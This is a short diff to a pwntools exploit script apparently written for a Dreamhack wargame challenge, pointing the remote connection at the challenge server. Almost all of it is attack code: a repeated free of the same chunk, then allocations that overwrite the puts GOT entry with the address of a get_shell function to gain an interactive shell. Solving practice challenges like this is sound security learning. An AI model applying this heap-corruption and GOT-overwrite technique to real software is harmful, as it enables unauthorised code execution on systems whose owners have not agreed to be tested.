@@ -24,7 +24,7 @@ def GDB():
 
 
 if args.REMOTE:
-    p = remote('')
+    p = remote('host3.dreamhack.games', 15773)
 else:
     p = process([exe.path])
 GDB()
@@ -52,8 +52,8 @@ modify(1, 15, b'A'*8)
 delete(1)
 modify(1, 15, b'A'*8)
 delete(1)
-create(9, p64(exe.got['puts'] + 1))
+create(9, p64(exe.got['puts']))
 create(9, b'A')
-create(9, b'AAAAA'+p32(exe.sym['get_shell']))
+create(9, p64(exe.sym['get_shell']))
 
 p.interactive()
